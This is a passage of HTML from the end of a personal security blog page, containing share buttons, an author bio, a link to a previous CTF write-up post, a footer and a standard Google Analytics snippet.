           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
          <i class="fa fa-twitter fa-lg"></i>
          Twitter
        </a>
        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
          <i class="fa fa-facebook fa-lg"></i>
          Facebook
        </a>
        <a class="btn btn-default btn-sm gplus"
           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
          <i class="fa fa-google-plus fa-lg"></i>
          Google+
        </a>
      </section>

      <section class="col-sm-6 author">
        <img src="//www.gravatar.com/avatar/" class="img-rounded author-image" />
        <h4 class="section-title author-name">Quentin Meffre</h4>
        <p class="author-bio">Computer science student, passionate about Cyber Security.</p>
      </section>
    </div>

    <div class="clearfix"></div>

		<ul class="pager">
		  
		  <li class="previous"><a href="/write-up/2018/03/04/write_up_pragyan.html" title="[Write-Up] Pragyan CTF - Old school hack">&larr; Previous</a></li>
		  
		  
			<li class="next disabled"><a>Next &rarr;</a>
		  
		</ul>

		<hr>
	</div>
	
	<div class="col-sm-2 sidebar-2">
	
	</div>
</article>
<div class="clearfix"></div>





		<footer>
			<hr/>
			<p>
				&copy; 2018 Quentin Meffre with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
			</p>
		</footer>
	</div>

	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="/assets/js/app.js"></script>
</body>
</html>



<!-- Asynchronous Google Analytics snippet -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-90952644-1', 'auto');
  ga('send', 'pageview');
</script>

